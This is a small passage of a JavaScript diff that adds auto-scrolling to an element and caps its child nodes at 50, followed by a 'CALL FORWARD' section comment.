+  el.scrollTop = el.scrollHeight;
+  while (el.children.length > 50) el.removeChild(el.firstChild);
 }
 
 // ═══ CALL FORWARD ═══
